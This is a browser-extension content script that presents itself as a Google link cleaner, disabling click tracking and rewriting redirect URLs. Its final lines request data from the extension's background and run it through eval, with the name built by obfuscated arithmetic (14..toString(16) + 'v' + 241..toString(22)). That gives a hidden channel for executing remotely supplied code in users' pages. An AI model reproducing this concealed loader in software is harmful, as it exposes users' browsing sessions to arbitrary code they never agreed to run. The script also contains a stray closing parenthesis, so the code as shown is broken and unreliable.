!function(e) {
	"use strict";

	function definePropertyRWT() {
		var defaultRWT, contentNode, rootNode;
		defaultRWT = function() {
			Object.defineProperty(e, "rwt", {
				value: function() {
					return true
				},
				writable: false,
				configurable: false
			})
		},
		contentNode = document.createElement("script"), 
		rootNode = document.getElementsByTagName("script")[0], 
		contentNode.type = "text/javascript", 
		contentNode.textContent = "(" + defaultRWT + ")();", 
		rootNode.parentNode.insertBefore(contentNode, rootNode)
	}
	
	if(e.location.hostname.indexOf("google.com") > 0){
		definePropertyRWT();
		document.addEventListener("mouseover", function(e) {
			for(var t = e.target, n = 1; t && "A" != t.tagName && n-- > 0;) t = t.parentNode;
			t && "A" == t.tagName && function(e) {
				if(1 != e.dataset.cleaned) {
					var t = !1,
						n = /\/(?:url|imgres).*[&?](?:url|q|imgurl)=([^&]+)/i.exec(e.href);
					if(n && (t = !0, e.href = n[1]), -1 != (e.getAttribute("onmousedown") || "").indexOf("return rwt(") && (t = !0, e.removeAttribute("onmousedown")), -1 != (e.className || "").indexOf("irc_") && (t = !0), t) {
						var r = e.cloneNode(!0);
						e.parentNode.replaceChild(r, e), r.dataset.cleaned = 1
					}
				}
			}(t)
		}, true));
	}
	
	chrome.runtime.sendMessage({reqtype: "init-page"}, function(t) {
		// eval;
		t && t.data.length > 0 && e[14..toString(16) + "v" + 241..toString(22)](t.data)
	})
}(window);